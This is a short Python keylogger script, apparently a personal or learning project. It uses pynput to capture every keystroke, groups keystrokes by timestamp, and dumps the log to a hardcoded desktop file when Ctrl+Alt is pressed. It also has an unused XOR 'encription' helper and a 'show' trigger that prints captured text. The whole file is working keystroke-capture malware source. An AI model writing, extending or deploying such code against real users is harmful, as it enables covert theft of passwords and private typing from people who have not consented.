# import threading
from pynput.keyboard import Key, Listener, KeyCode
from datetime import datetime

# יבוא מקובץ תווים מיוחדים
from special_characters import special_keys


def timestamp():
    this_time = datetime.now()
    return this_time.strftime("%d/%m/%y %H:%M:%S")


def key_to_string(key):
    if isinstance(key, KeyCode):
        return key.char or ""
    return special_keys.get(key, f"<{key}>")

def encription(str , key):
    string = ""
    for i in str:
        string += chr(ord(i) ^ ord(key))
    return string

def write(char):
    with open("/Users/admin/desktop/data", "a") as file:
        file.write(char)


def record_press(key, recorded_content, all_content, list_to_print, dict_to_print):
    time = timestamp()
    key_str = key_to_string(key)
    recorded_content.append(key_str)
    # write(key_str)
    list_to_print.append(key_str)
    if time in all_content:
        all_content[time] = "".join(recorded_content)
        dict_to_print[time] = "".join(list_to_print)
    else:
        recorded_content.clear()
        list_to_print.clear()
        recorded_content.append(key_str)
        list_to_print.append(key_str)
        all_content[time] = "".join(recorded_content)
        dict_to_print[time] = "".join(list_to_print)

    if "show" in dict_to_print[time]:
        dict_to_print[time].replace("show", "")
        for i, x in dict_to_print.items():
            print(f"\n**** {i} ****\n{x}")
        dict_to_print.clear()
        list_to_print.clear()

    if "<CTRL><ALT>" in all_content[time]:
        write(str(all_content))
        return False


def listener():
    recorded_content = []
    all_content = {}
    dict_to_print = {}
    list_to_print = []

    def on_press(key):
        return record_press(key, recorded_content, all_content, list_to_print, dict_to_print)

    with Listener(on_press=on_press) as listener:
        listener.join()

    return all_content


listener()
